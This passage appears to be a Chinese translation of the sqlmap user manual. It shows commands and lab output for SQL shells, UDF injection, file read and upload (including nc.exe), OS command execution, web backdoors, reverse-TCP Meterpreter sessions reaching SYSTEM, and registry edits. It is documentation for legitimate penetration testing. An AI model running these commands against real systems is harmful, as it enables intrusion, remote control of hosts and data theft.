queries to be able to retrieve the output even <span class="hljs-keyword">if</span> we are</span><br><span class="line">going blind</span><br><span class="line">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(102)+CHAR(111)+CHAR(111)) AS</span><br><span class="line">VARCHAR(8000)), (CHAR(32)))</span><br><span class="line">[hh:mm:50] [INFO] retrieved: foo</span><br><span class="line">[hh:mm:50] [DEBUG] performed 27 queries <span class="hljs-keyword">in</span> 0 seconds</span><br><span class="line">[hh:mm:50] [DEBUG] query: SELECT ISNULL(CAST((CHAR(98)+CHAR(97)+CHAR(114)) AS VA</span><br><span class="line">RCHAR(8000)), (CHAR(32)))</span><br><span class="line">[hh:mm:50] [INFO] retrieved: bar</span><br><span class="line">[hh:mm:50] [DEBUG] performed 27 quer</span><br></pre></td></tr></table></figure></p><p>如你所见，Sqlmap将提供的SQL语句分成了两个不同的SELECT语句，并分别返回结果。</p><p>参数“–sql-shell”提供一个交互式的SQL语句执行环境，支持Tab键补全和命令历史记录。如：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.56.102/user.php?id=1"</span> --sql-shell</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[15:06:47] [INFO] calling MySQL shell. To quit <span class="hljs-built_in">type</span> <span class="hljs-string">'x'</span> or <span class="hljs-string">'q'</span> and press ENTER</span><br><span class="line">sql-shell&gt; select <span class="hljs-string">'foo'</span>;</span><br><span class="line">[15:07:41] [INFO] fetching SQL SELECT statement query output: <span class="hljs-string">'select '</span>foo<span class="hljs-string">''</span></span><br><span class="line">select <span class="hljs-string">'foo'</span>;:    <span class="hljs-string">'foo'</span></span><br><span class="line">sql-shell&gt; select password from mysql.user <span class="hljs-built_in">where</span> user=<span class="hljs-string">'root'</span>;</span><br><span class="line">[15:07:42] [INFO] fetching SQL SELECT statement query output: <span class="hljs-string">'select password from mysql.user where user='</span>root<span class="hljs-string">''</span></span><br><span class="line">select password from mysql.user <span class="hljs-built_in">where</span> user=<span class="hljs-string">'root'</span>; [1]:</span><br><span class="line">[*] *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">sql-shell&gt; show tables;</span><br><span class="line">[15:11:15] [INFO] fetching SQL SELECT statement query output: <span class="hljs-string">'show tables'</span></span><br><span class="line">[15:11:15] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries)</span><br><span class="line">show tables; [1]:</span><br></pre></td></tr></table></figure></p><h3 id="0x0E-UDF注入"><a href="#0x0E-UDF注入" class="headerlink" title="0x0E UDF注入"></a>0x0E UDF注入</h3><p><strong>参数：–udf-inject</strong><br>UDF是“user-defined function”的缩写，UDF是一种针对MySQL和PostgreSQL的高级注入技术，详情见《Advanced SQL injection to operating system full control》。</p><p>可以编译MySQL或PostgreSQL的共享库、DLL（Windows）和共享对象（Linux/Unix）并将这些文件在本机上的路径提供给Sqlmap来进行UDF注入。<br>Sqlmap会先问一些问题然后上传UDF文件并创建UDF最后根据问题答案执行UDF。完成UDF注入后，Sqlmap会删除上传的UDF文件。</p><p><strong>参数：–shared-lib</strong><br>添加此参数Sqlmap会在运行时询问共享库文件路径。</p><p>在Sqlmap安装目录的udf目录中有许多UDF文件，按照DMBS、操作系统、位数和版本归类，可以直接使用。</p><h3 id="0X0F-访问文件系统"><a href="#0X0F-访问文件系统" class="headerlink" title="0X0F 访问文件系统"></a>0X0F 访问文件系统</h3><p><strong><em>1.读取文件</em></strong><br><strong>参数：–file-read</strong><br>当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有读取文件相关权限时读取文件是可行的。<br>读取的文件既可以是文件文件也可以是二进制文件，Sqlmap会处理好的。下例的目标数据库管理系统是SQL Server 2005：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther"</span> --file-read <span class="hljs-string">"C:/example.exe"</span> -v 1</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:49] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 2000</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 6.0, ASP</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2005</span><br><span class="line">[hh:mm:50] [INFO] fetching file: <span class="hljs-string">'C:/example.exe'</span></span><br><span class="line">[hh:mm:50] [INFO] the SQL query provided returns 3 entries</span><br><span class="line">C:/example.exe file saved to:</span><br><span class="line"><span class="hljs-string">'/software/sqlmap/output/192.168.136.129/files/C__example.exe'</span></span><br></pre></td></tr></table></figure></p><p>然后查看下载的文件：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l output/192.168.136.129/files/C__example.exe</span><br><span class="line">-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C__example.exe</span><br><span class="line">$ file output/192.168.136.129/files/C__example.exe</span><br><span class="line">output/192.168.136.129/files/C__example.exe: PE32 executable <span class="hljs-keyword">for</span> MS Windows (GUI) Intel 80386 32-bit</span><br></pre></td></tr></table></figure></p><p><strong><em>2.上传文件</em></strong><br><strong>参数：–file-write和–file-dest</strong><br>当数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有写文件相关权限时上传文件是可行的。<br>上传的文件既可以是文件文件也可以是二进制文件，Sqlmap会处理好的。下例的目标数据库管理系统是MySQL，上传了一个二进制的UPX压缩文件：</p><pre><code>$ file /software/nc.exe.packed/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32-bit$ ls -l /software/nc.exe.packed-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed$ python sqlmap.py -u &quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot; -\-file-write &quot;/software/nc.exe.packed&quot; --file-dest &quot;C:/WINDOWS/Temp/nc.exe&quot; -v 1[...][hh:mm:29] [INFO] the back-end DBMS is MySQLweb server operating system: Windows 2003 or 2008web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: MySQL &gt;= 5.0.0[...]do you want confirmation that the file &apos;C:/WINDOWS/Temp/nc.exe&apos; has been successfully written on the back-end DBMS file system? [Y/n] y[hh:mm:52] [INFO] retrieved: 31744[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 bytes, same size as the local file &apos;/software/nc.exe.packed&apos;</code></pre><h3 id="0x10-操作系统控制"><a href="#0x10-操作系统控制" class="headerlink" title="0x10 操作系统控制"></a>0x10 操作系统控制</h3><p><strong><em>1.执行任意操作系统命令</em></strong><br><strong>参数：–os-cmd和–os-shell</strong><br>若数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有相关权限Sqlmap就能利用SQL注入执行任意的操作系统命令。</p><p>当数据库管理系统是MySQL或PostgreSQL时，Sqlmap会通过前面介绍过的文件上传功能上传一个包含用户自定义函数sys_exec()和sys_eval()的二进制共享库文件，然后创建这两个用户自定义函数，通过这两个函数之一来执行用户指定的命令。选择哪个函数取决于用户是否想要显示命令执行的标准输出。</p><p>当数据库管理系统是微软的SQL Server时，Sqlmap通过存储过程xp_cmdshell来执行任意命令。<br>若xp_cmdshell被禁用（SQL Server &gt;= 2005时默认禁用）Sqlmap会启用它；<br>若xp_cmdshell不存在，Sqlmap会创建它。</p><p>当用户想要看到命令执行的标准输出时，Sqlmap使用可列举的注入技术（盲注、带内和基于错误的注入），而当用户不想看到命令执行的标准输出时，堆查询注入技术将被用于执行命令。</p><p>下例的目标是PostgreSQL：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1"</span> --os-cmd id -v 1</span><br></pre></td></tr></table></figure></p><p>部分输出如下所示：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[hh:mm:12] [INFO] the back-end DBMS operating system is Linux</span><br><span class="line">[hh:mm:12] [INFO] testing <span class="hljs-keyword">if</span> current user is DBA</span><br><span class="line">[hh:mm:12] [INFO] detecting back-end DBMS version from its banner</span><br><span class="line">[hh:mm:12] [INFO] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">'sys_eval'</span> already exist</span><br><span class="line">[hh:mm:12] [INFO] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">'sys_exec'</span> already exist</span><br><span class="line">[hh:mm:12] [INFO] creating UDF <span class="hljs-string">'sys_eval'</span> from the binary UDF file</span><br><span class="line">[hh:mm:12] [INFO] creating UDF <span class="hljs-string">'sys_exec'</span> from the binary UDF file</span><br><span class="line"><span class="hljs-keyword">do</span> you want to retrieve the <span class="hljs-built_in">command</span> standard output? [Y/n/a] y</span><br><span class="line"><span class="hljs-built_in">command</span> standard output:</span><br><span class="line"><span class="hljs-string">'uid=104(postgres) gid=106(postgres) groups=106(postgres)'</span></span><br><span class="line">[hh:mm:19] [INFO] cleaning up the database management system</span><br><span class="line"><span class="hljs-keyword">do</span> you want to remove UDF <span class="hljs-string">'sys_eval'</span>? [Y/n] y</span><br><span class="line"><span class="hljs-keyword">do</span> you want to remove UDF <span class="hljs-string">'sys_exec'</span>? [Y/n] y</span><br><span class="line">[hh:mm:23] [INFO] database management system cleanup finished</span><br><span class="line">[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file system can only be deleted manually</span><br></pre></td></tr></table></figure></p><p>使用参数“–os-shell”可以模拟一个可以执行任意命令的shell，和“–sql-shell”一样这个shell也可以用Tab键补全，支持历史记录。</p><p>当堆查询不被支持（如PHP或ASP+Mysql）且数据库管理系统是MySQL时，仍然可以通过SELECT的从句INTO OUTFILE在Web所在主机的可写目录创建一个Web后门，通过这个Web后门来执行命令。Sqlmap支持这一技术并要求用户提供一些用逗号分割的可能是可写目录的路径。Sqlmap支持以下这些服务器端脚本语言：</p><pre><code>ASPASP.NETJSPPHP</code></pre><p><strong><em>2.带外TCP连接：Meterpreter及相关</em></strong><br><strong>参数：–os-pwn、–os-smbrelay、–os-bof、–priv-esc、–msf-path和–tmp-path</strong><br>若数据库管理系统是MySQL、PostgreSQL或微软的SQL Server且当前用户有相关权限Sqlmap就有可能在攻击者的主机和数据库所在主机之间建立带外TCP连接。根据用户的选择，此连接可以是交互式命令shell，Meterpreter会话或图形用户界面（VNC）会话。</p><p>Sqlmap要靠Metasploit生成shellcode，在数据库所在主机执行shellcode有以下四种技术：</p><pre><code>数据库通过Sqlmap创建的用户自定义函数sys_bineval()在内存中执行Metasploit的shellcode。支持MySQL和PostgreSQL。参数“–os-pwn”。通过Sqlmap自己的用户自定义函数（MySQL和PostgreSQL中的sys_exec()，微软SQL Server中的xp_cmdshell()）上传并执行Metasploit的“stand-alone payload stager”。参数：“–os-pwn”。利用远程代码执行漏洞MS08-068。攻击者的机器要用Metasploit的smb_relay监听来自目标机器的连接。要求在Linux/Unix上以root权限运行Sqlmap且目标DBMS在Windows上以管理员权限运行。参数：“–os-smbrelay”。在微软SQL Server 2000和2005中可通过存储过程sp_replwritetovarbin的堆缓冲区溢出漏洞（MS09-004）在内存中执行Metasploit的shellcode。Sqlmap有自己的数据执行保护绕过技术可以成功利用漏洞，但需要Metasploit生成shellcode以便在成功利用漏洞时执行shellcode。参数：“–os-bof”。</code></pre><p>下面是以MySQL为目标的例子：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1"</span> --os-pwn --msf-path /software/metasploit</span><br><span class="line"> </span><br><span class="line">[...]</span><br><span class="line">[hh:mm:31] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Windows 2003</span><br><span class="line">web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0</span><br><span class="line">back-end DBMS: MySQL 5.0</span><br><span class="line">[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system</span><br><span class="line">[hh:mm:31] [INFO] the back-end DBMS operating system is Windows</span><br><span class="line">how <span class="hljs-keyword">do</span> you want to establish the tunnel?</span><br><span class="line">[1] TCP: Metasploit Framework (default)</span><br><span class="line">[2] ICMP: icmpsh - ICMP tunneling</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:32] [INFO] testing <span class="hljs-keyword">if</span> current user is DBA</span><br><span class="line">[hh:mm:32] [INFO] fetching current user</span><br><span class="line">what is the back-end database management system architecture?</span><br><span class="line">[1] 32-bit (default)</span><br><span class="line">[2] 64-bit</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:33] [INFO] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">'sys_bineval'</span> already exist</span><br><span class="line">[hh:mm:33] [INFO] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">'sys_exec'</span> already exist</span><br><span class="line">[hh:mm:33] [INFO] detecting back-end DBMS version from its banner</span><br><span class="line">[hh:mm:33] [INFO] retrieving MySQL base directory absolute path</span><br><span class="line">[hh:mm:34] [INFO] creating UDF <span class="hljs-string">'sys_bineval'</span> from the binary UDF file</span><br><span class="line">[hh:mm:34] [INFO] creating UDF <span class="hljs-string">'sys_exec'</span> from the binary UDF file</span><br><span class="line">how <span class="hljs-keyword">do</span> you want to execute the Metasploit shellcode on the back-end database und</span><br><span class="line">erlying operating system?</span><br><span class="line">[1] Via UDF <span class="hljs-string">'sys_bineval'</span> (<span class="hljs-keyword">in</span>-memory way, anti-forensics, default)</span><br><span class="line">[2] Stand-alone payload stager (file system way)</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode</span><br><span class="line"><span class="hljs-built_in">which</span> connection <span class="hljs-built_in">type</span> <span class="hljs-keyword">do</span> you want to use?</span><br><span class="line">[1] Reverse TCP: Connect back from the database host to this machine (default)</span><br><span class="line">[2] Reverse TCP: Try to connect back from the database host to this machine, on</span><br><span class="line">all ports</span><br><span class="line">between the specified and 65535</span><br><span class="line">[3] Bind TCP: Listen on the database host <span class="hljs-keyword">for</span> a connection</span><br><span class="line">&gt;</span><br><span class="line"><span class="hljs-built_in">which</span> is the <span class="hljs-built_in">local</span> address? [192.168.136.1]</span><br><span class="line"><span class="hljs-built_in">which</span> <span class="hljs-built_in">local</span> port number <span class="hljs-keyword">do</span> you want to use? [60641]</span><br><span class="line"><span class="hljs-built_in">which</span> payload <span class="hljs-keyword">do</span> you want to use?</span><br><span class="line">[1] Meterpreter (default)</span><br><span class="line">[2] Shell</span><br><span class="line">[3] VNC</span><br><span class="line">&gt;</span><br><span class="line">[hh:mm:40] [INFO] creation <span class="hljs-keyword">in</span> progress ... <span class="hljs-keyword">done</span></span><br><span class="line">[hh:mm:43] [INFO] running Metasploit Framework <span class="hljs-built_in">command</span> line interface locally, please <span class="hljs-built_in">wait</span>..</span><br><span class="line"> </span><br><span class="line">=[ metasploit v3.7.0-dev [core:3.7 api:1.0]</span><br><span class="line">+ -- --=[ 674 exploits - 351 auxiliary</span><br><span class="line">+ -- --=[ 217 payloads - 27 encoders - 8 nops</span><br><span class="line">=[ svn r12272 updated 4 days ago (2011.04.07)</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">EXITFUNC =&gt; thread</span><br><span class="line">LPORT =&gt; 60641</span><br><span class="line">LHOST =&gt; 192.168.136.1</span><br><span class="line">[*] Started reverse handler on 192.168.136.1:60641</span><br><span class="line">[*] Starting the payload handler...</span><br><span class="line">[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF <span class="hljs-string">'sys_bineval'</span>, please <span class="hljs-built_in">wait</span>..</span><br><span class="line">[*] Sending stage (749056 bytes) to 192.168.136.129</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) at Mon Apr 11 hh:mm:52 +0100 2011</span><br><span class="line">meterpreter &gt; Loading extension espia...success.</span><br><span class="line">meterpreter &gt; Loading extension incognito...success.</span><br><span class="line">meterpreter &gt; [-] The <span class="hljs-string">'priv'</span> extension has already been loaded.</span><br><span class="line">meterpreter &gt; Loading extension sniffer...success.</span><br><span class="line">meterpreter &gt; System Language : en_US</span><br><span class="line">OS            : Windows .NET Server (Build 3790, Service Pack 2).</span><br><span class="line">Computer      : W2K3R2</span><br><span class="line">Architecture  : x86</span><br><span class="line">Meterpreter   : x86/win32</span><br><span class="line">meterpreter &gt; Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"> </span><br><span class="line">MS TCP Loopback interface</span><br><span class="line">Hardware MAC: 00:00:00:00:00:00</span><br><span class="line">IP Address : 127.0.0.1</span><br><span class="line">Netmask    : 255.0.0.0</span><br><span class="line"> </span><br><span class="line">Intel(R) PRO/1000 MT Network Connection</span><br><span class="line">Hardware MAC: 00:0c:29:<span class="hljs-built_in">fc</span>:79:39</span><br><span class="line">IP Address : 192.168.136.129</span><br><span class="line">Netmask    : 255.255.255.0</span><br><span class="line"> </span><br><span class="line">meterpreter &gt; <span class="hljs-built_in">exit</span></span><br><span class="line">[*] Meterpreter session 1 closed. Reason: User <span class="hljs-built_in">exit</span></span><br></pre></td></tr></table></figure></p><p>在Windows中Mysql默认以SYSTEM身份运行，但PostgreSQL无论是在Windows还是在Linux中都以低权限的用户postgres运行。SQL Server 2000默认以SYSTEM身份运行，但SQL Server 2005到2008大多数时间以NETWORK SERVICE身份运行，少数时候以LOCAL SERVICE身份运行。</p><p>使用参数“–priv-esc”可以执行Metasploit的getsystem命令以尝试提升权限。</p><h3 id="0x11-Windows注册表操作"><a href="#0x11-Windows注册表操作" class="headerlink" title="0x11 Windows注册表操作"></a>0x11 Windows注册表操作</h3><p>满足以下条件就可以对Windows注册表进行操作：</p><pre><code>目标数据库管理系统是运行在Windows上的目标数据库管理系统是MySQL、PostgreSQL或微软SQL Server支持堆查询目标数据库管理系统当前用户有足够的权限</code></pre><p><strong><em>1.读Windows注册表键值</em></strong><br><strong>参数：–reg-read</strong><br><strong><em>2.写Windows注册表键值</em></strong><br><strong>参数：–reg-add</strong><br><strong><em>3.删除Windows注册表键值</em></strong><br><strong>参数：–reg-del</strong><br><strong><em>4.辅助</em></strong><br><strong>参数：–reg-key、–reg-value、–reg-data和–reg-type</strong><br>适当使用上列参数就可以在命令中添加或修改一个Windows注册表键值而不用在Sqlmap运行时以问答方式提供数据。</p><pre><code>–reg-key：指定Windows注册表键值的路径–reg-value：指定Windows注册表键值的键–reg-data：指定Windows注册表键值的值–reg-type：指定Windows注册表键值的值的数据类型</code></pre><p>下面是一个例子：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key=<span class="hljs-string">"HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap"</span> --reg-value=Test --reg-type=REG_SZ --reg-data=1</span><br></pre></td></tr></table></figure></p><h3 id="0x12-通用选项"><a href="#0x12-通用选项" class="headerlink" title="0x12 通用选项"></a>0x12 通用选项</h3><p><strong><em>1.从SQLite文件中载入Sqlmap会话</em></strong><br><strong>参数：-s</strong><br>Sqlmap会自动地为每一个目标创建长久保存的会话SQLite文件，该文件统一存储在特定目录（如：~/.sqlmap/output/）中，其中保存着恢复会话所需的所有数据。若用户想要明确地指定SQLite文件（例如想要将多个目标的数据存储到同一个SQLite文件中），可使用此参数。<br><strong><em>2.将HTTP(S)流量记录到日志文件中</em></strong><br><strong>参数：-t</strong><br>该参数后跟一个文件路径，用于将HTTP(S)请求和响应以文本格式记录到文件中作为日志。这样的日志在调试时是很有用的。<br><strong><em>3.非交互模式</em></strong><br><strong>参数：–batch</strong><br>使用该参数可以让Sqlmap以非交互模式运行，所有要求的输入都会取默认值。<br><strong><em>4.设置字符编码</em></strong><br><strong>参数：–charset</strong><br>为正确解码数据，Sqlmap会使用Web服务器提供的信息（如HTTP头部中字符编码的设置），或是使用第三方库chardet来启发式地确定字符编码。</p><p>可以使用参数“–charset”来指定字符编码，如“–charset=GBK”。<br><strong><em>5.从目标URL开始爬取目标站点</em></strong><br><strong>参数：–crawl</strong><br>Sqlmap可以从目标URL开始爬取目标站点并收集可能存在漏洞的URL。使用该参数还需要设置爬取深度，深度是相对于开始爬取的目标URL而言的。只有所有新链接都被递归地访问过后才算爬取结束。建议该参数与“–delay”配合使用。</p><p>下例的目标的MySQL：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.21.128/sqlmap/mysql/"</span> --batch --crawl=3</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:53] [INFO] starting crawler</span><br><span class="line">[xx:xx:53] [INFO] searching <span class="hljs-keyword">for</span> links with depth 1</span><br><span class="line">[xx:xx:53] [WARNING] running <span class="hljs-keyword">in</span> a single-thread mode. This could take a <span class="hljs-keyword">while</span></span><br><span class="line">[xx:xx:53] [INFO] searching <span class="hljs-keyword">for</span> links with depth 2</span><br><span class="line">[xx:xx:54] [INFO] heuristics detected web page charset <span class="hljs-string">'ascii'</span></span><br><span class="line">[xx:xx:00] [INFO] 42/56 links visited (75%)</span><br></pre></td></tr></table></figure></p><p><strong>参数：–crawl-exclude</strong><br>在此参数后跟一个正则表达式可以排除不想爬取的URL。若URL匹配正则，则不被爬取。如用“–crawl-exclude=logout”来排除所有含有字符串“logout”的URL。<br><strong><em>6.设置输出CSV文件中的分隔符</em></strong><br><strong>参数：–csv-del</strong><br>当数据被输出到CSV文件（–dump-format=CSV）时，默认以“,”分隔，可以使用此参数指定分隔符。如：“–csv-del=”;””。<br><strong><em>7.数据库管理系统认证凭据</em></strong><br><strong>参数：–dbms-cred</strong><br>在某些情况下由于数据库管理系统当前用户权限较低从而导致动作执行失败，此时可以用此参数提供admin用户认证凭据，Sqlmap就会对执行失败的部分特地使用“run as”机制（如：微软SQL Server的OPENROWSET）以admin用户身份重新执行失败的动作。当然，得知道admin用户认证凭据才行。<br><strong><em>8.数据输出格式</em></strong><br><strong>参数：–dump-format</strong><br>Sqlmap对列举的数据有三种不同的输出格式：CSV、HTML和SQLITE。默认为CSV格式，每个数据表都被保存到一个文本文件中，一行是一条记录，以逗号分隔（或是用“–csv-del”指定分隔符）。选择HTML格式，所有数据被保存在一个HTML文件中，数据存放在一个个table中。选择SQLITE格式，所有数据被保存在一个SQLITE文件中，SQLITE中表名和结构会和原表相同。<br><strong><em>9.估计完成时间</em></strong><br><strong>参数：–eta</strong><br>该参数用于显示估计的完成时间。下例是目标为Oracle的布尔型盲注：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id=1"</span> -b --eta</span><br></pre></td></tr></table></figure></p><p>部分输出如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hh:mm:01] [INFO] the back-end DBMS is Oracle</span><br><span class="line">[hh:mm:01] [INFO] fetching banner</span><br><span class="line">[hh:mm:01] [INFO] retrieving the length of query output</span><br><span class="line">[hh:mm:01] [INFO] retrieved: 64</span><br><span class="line">17% [========&gt;                                           ] 11/64</span><br><span class="line"> </span><br><span class="line">Then:</span><br><span class="line"> </span><br><span class="line">100% [===================================================] 64/64</span><br><span class="line">[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod</span><br><span class="line"> </span><br><span class="line">web application technology: PHP 5.2.6, Apache 2.2.9</span><br><span class="line">back-end DBMS: Oracle</span><br><span class="line">banner:</span><br><span class="line"><span class="hljs-string">'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'</span></span><br></pre></td></tr></table></figure></p><p>如你所见，Sqlmap先计算查询输出的长度，然后估计完成时间，最后显示百分比进度条并统计已经接受的数据。<br><strong><em>10.刷新会话文件</em></strong><br><strong>参数：–flush-session</strong><br>使用该参数可以刷新会话文件，以避免Sqlmap默认的缓存机制可能造成的一些问题。使用该参数的前提是真正理解会话文件的概念。另外一个可行的方法是手工删除会话文件。<br><strong><em>11.解析和测试表单输入字段</em></strong><br><strong>参数：–forms</strong><br>除了用“-r”和“–data”来测试表单数据是否存在注入点外，还可以使用参数“–forms”来测试表单数据是否存在注入点。<br>同时使用参数“–forms”和“-u”，Sqlmap会解析目标URL（“-u”指定的那个URL）返回页面中的表单，测试表单是否有注入点，而不对目标URL进行注入测试。<br><strong><em>12.忽略会话文件中的查询结果</em></strong><br><strong>参数：-fresh-queries</strong><br>使用此参数用于忽略会话文件中的查询结果重新执行查询。<br><strong><em>13.对返回结果使用HEX函数</em></strong><br><strong>参数：–hex</strong><br>非ASCII数据很容易在传输时出错，使用hex函数可以将目标数据库中数据以十六进制返回。</p><p>下例的目标是PostgreSQL：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="hljs-string">"http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1"</span> --banner --hex -v 3 --parse-errors</span><br></pre></td></tr></table></figure></p><p>部分输出如下所示：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[xx:xx:14] [INFO] fetching 